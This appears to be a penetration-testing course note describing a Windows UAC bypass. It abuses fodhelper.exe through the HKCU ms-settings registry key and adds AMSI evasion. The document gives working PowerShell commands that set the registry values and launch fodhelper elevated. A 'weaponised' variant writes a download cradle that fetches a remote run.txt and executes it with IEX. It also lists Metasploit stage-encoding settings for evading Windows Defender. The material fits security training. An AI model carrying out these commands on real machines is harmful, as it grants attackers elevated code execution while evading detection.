# 06.05 UAC Bypass FodHelper with AMSI Evasion

> Section 7.5 · HKCU ms-settings registry · download cradle with AMSI bypass

## Overview

FodHelper.exe (C:\Windows\System32\fodhelper.exe) runs as high integrity and reads from HKCU — which a medium-integrity user can write. Create the ms-settings registry key, set its Default value to a PowerShell command, and add a DelegateExecute value. Launching fodhelper spawns the Default value as a high-integrity process. The default Metasploit fodhelper module is blocked by AMSI; the fix is to embed an AMSI bypass inside the hosted run.txt script. Combine with x64/zutto_dekiru stage encoding to evade network detection.

## Steps

- **Registry path** — `HKCU:\Software\Classes\ms-settings\shell\open\command` — does not exist by default.
- **PoC** — New-Item sets (Default) to powershell.exe; New-ItemProperty adds empty DelegateExecute value; run fodhelper.exe.
- **Metasploit fails** — `exploit/windows/local/bypassuac_fodhelper` triggers AMSI; Windows Defender quarantines the PS component.
- **Download cradle fix** — set (Default) to PS download cradle pointing to run.txt; add AMSI bypass at top of run.txt.
- **Stage encoding** — `set EnableStageEncoding true; set StageEncoder x64/zutto_dekiru` to evade Defender network inspection of second stage.
- **Cleanup** — `Remove-Item -Path HKCU:\Software\Classes\ms-settings -Recurse -Force`.

## Commands

### Registry key path

```powershell
# Registry key that FodHelper reads on launch — writable by medium-integrity users
HKCU:\Software\Classes\ms-settings\shell\open\command
```

### Proof of concept

```powershell
# Create registry keys and set Default value to spawn PowerShell elevated
PS C:\Users\Offsec> New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe -Force

PS C:\Users\Offsec> New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force

PS C:\Users\Offsec> C:\Windows\System32\fodhelper.exe
```

### Weaponised — download cradle with AMSI bypass

```powershell
# Set Default value to PS download cradle — run.txt must start with an AMSI bypass
PS C:\Users\Offsec> New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX" -Force

PS C:\Users\Offsec> New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force

PS C:\Users\Offsec> C:\Windows\System32\fodhelper.exe
```
